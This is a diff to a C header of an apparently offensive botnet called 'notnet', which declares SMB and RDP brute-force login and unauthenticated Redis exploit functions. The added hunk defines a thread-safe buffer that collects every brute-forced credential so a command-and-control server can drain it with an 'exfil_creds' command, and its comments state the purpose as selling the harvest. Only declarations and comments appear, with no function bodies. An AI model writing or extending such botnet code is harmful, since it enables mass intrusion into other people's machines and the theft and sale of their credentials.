@@ -103,4 +103,33 @@ int try_login_smb(const char *ip, uint16_t port, const char *user, const char *p
 int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass);
 int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port);
 int exploit_redis_sock(notnet_bot_t *bot, int sock);
+
+/* ── Credential-log buffer (#90) ─────────────────────────── */
+/* Smash-and-grab log-sale monetization. Every successful brute-force
+ * credential is buffered here (bounded, mutex-protected) so the C2 can
+ * pull the whole harvest via the `exfil_creds` command and sell it.
+ * Each entry is one line "proto|ip|port|user|pass", capped at
+ * CRED_LOG_ENTRY_MAX bytes.
+ *
+ * Overflow policy: DROP-NEWEST with a log_warn — the buffer is a fixed
+ * ring that never grows, and a fresh credential is discarded rather than
+ * evicting an older one the C2 has not yet pulled. The buffer is drained
+ * (and cleared) by exfil_creds, so capacity resets to zero after each
+ * pull. All functions are safe to call from scan threads and the C2 loop
+ * (mutex-protected; spread.c uses the same pthread_mutex pattern as
+ * src/proxy.c). */
+#define CRED_LOG_MAX_ENTRIES 256
+#define CRED_LOG_ENTRY_MAX   256
+
+/* Append one harvested credential to the log. Fields are precision-capped
+ * to fit CRED_LOG_ENTRY_MAX; the entry is dropped (with a log_warn) when
+ * the buffer is full. Thread-safe. */
+void spread_cred_record(const char *proto, const char *ip, uint16_t port,
+                        const char *user, const char *pass);
+/* Number of credentials currently buffered (for heartbeat cred_count). */
+unsigned int spread_cred_count(void);
+/* Drain the whole log into a caller-free'd heap buffer (one entry per
+ * line, NUL-terminated) and clear the buffer. Returns 0 on success,
+ * -1 on allocation failure. Thread-safe. */
+int spread_creds_drain(char **out, size_t *out_len);
 #endif /* NOTNET_SPREAD_H */
